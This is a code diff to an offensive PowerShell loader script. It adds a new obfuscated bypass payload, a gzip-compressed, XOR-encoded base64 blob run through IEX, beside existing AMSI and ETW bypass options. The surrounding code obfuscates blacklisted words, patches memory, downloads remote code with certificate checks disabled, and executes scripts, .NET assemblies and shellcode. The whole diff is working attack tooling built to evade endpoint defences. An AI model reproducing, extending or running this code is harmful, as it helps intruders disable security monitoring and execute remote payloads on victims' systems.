@@ -52,7 +52,7 @@ Function New-PowerLoader {
         [string[]]
         $ArgumentList,
 
-        [ValidateSet("AMSI","ETW","SBL","PML")]
+        [ValidateSet("AMSI","ETW","SBL","PML","PRM")]
         [string[]]
         $Bypass,
 
@@ -121,6 +121,14 @@ Function New-PowerLoader {
             $srcBypass += '$b = "H4sIAAAAAAAEAI3MsQqDMBAG4GfpIFQoZC+dxDrZIaEPEMKvnsNdMPFExYcXOjv0e4BP87qXDfTRSjczbi2FLEkGNVYWZDeC2XyVmHS9m4/0liYwRdQbwqwk8Q31xOlVDJ4Tnr/MOhf9RPG6qyTjn+sIXsO4HydzXsS6pAAAAA=="' + [Environment]::NewLine
             $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         }
+        'PRM' {
+            $srcBypass += '$b = "H4sIAAAAAAAEAMtI13RLKdXxyUstyU1RDAwKTklIzc3IT1HUccjN1agKTsnJK0/BJu2eV5yUUgMA4MdDiD8AAAA="' + [Environment]::NewLine
+            $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+        }
+    }
+    if ($srcBypass) {
+        # Skiping bypass procedures if Powershell version is below 5
+        $srcBypass = 'if ($PSVersionTable.CLRVersion.Major -gt 3) {' + [Environment]::NewLine + $srcBypass + '}' + [Environment]::NewLine
     }
 
     switch ($Type) {
@@ -147,7 +155,6 @@ Function Local:Remove-PoshComments {
     Param (
         [byte[]] $Bytes
     )
-
     $strBytes = [BitConverter]::ToString($Bytes)
     $strBytes = $strBytes -replace "3C-23-(.*?)-23-3E"
     $strBytes = $strBytes -replace "23-(.*?)-0A","0A"
@@ -164,7 +171,6 @@ Function Local:Get-ObfuscatedString {
         [String] $InputString,
         [String[]] $BlackList
     )
-
     foreach($word in $BlackList) {
         $string = -join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_})
         $InputString = $InputString.Replace($word,$string)
@@ -177,7 +183,6 @@ Function Local:Get-EncodedByte {
         [Parameter(Mandatory = $True)]
         [byte[]] $ByteArray
     )
-
     [IO.MemoryStream] $output = New-Object IO.MemoryStream
     $gzipStream = New-Object IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
     $gzipStream.Write($ByteArray, 0, $ByteArray.Length)
@@ -192,7 +197,6 @@ Function Local:Get-DecodedByte {
         [Parameter(Mandatory = $True)]
         [string] $EncBytes
     )
-
     Function Copy-Stream ($InputStream,$OutputStream) {
         $buffer = New-Object byte[] 4096
         while (($bytesRead = $InputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
@@ -215,7 +219,6 @@ Function Local:Invoke-MemoryPatch {
         [string] $Func,
         [byte[]] $Patch
     )
-
     Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -247,7 +250,6 @@ Function Local:Invoke-DownloadByte {
         [Parameter(Mandatory=$True)]
         [string] $URL
     )
-
     $code = $null
     try {
         [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
@@ -259,7 +261,7 @@ Function Local:Invoke-DownloadByte {
         }
         $client = [Net.WebRequest]::Create($URL)
         $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
-        $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+        $client.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
         $client.UserAgent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)'
         $response = $client.GetResponse()
         $respStream = $response.GetResponseStream()
@@ -289,7 +291,6 @@ Function Local:Invoke-PoshLoader {
 
         [string[]] $ArgumentList
     )
-
     Invoke-Expression "$Code $($ArgumentList -join ' ')"
 }
 
@@ -301,7 +302,6 @@ Function Local:Invoke-NetLoader {
 
         [string[]] $ArgumentList
     )
-
     $realStdOut = [Console]::Out
     $realStdErr = [Console]::Error
     $stdOutWriter = New-Object IO.StringWriter
@@ -318,6 +318,8 @@ Function Local:Invoke-NetLoader {
         Write-Warning $_
     }
     finally {
+        [Console]::Out.Flush()
+        [Console]::Error.Flush()
         [Console]::SetOut($realStdOut)
         [Console]::SetError($realStdErr)
         $output = $stdOutWriter.ToString()
@@ -333,7 +335,6 @@ Function Local:Invoke-ShellLoader {
         [Byte[]]
         $Code
     )
-
     Add-Type @"
 using System;
 using System.Runtime.InteropServices;
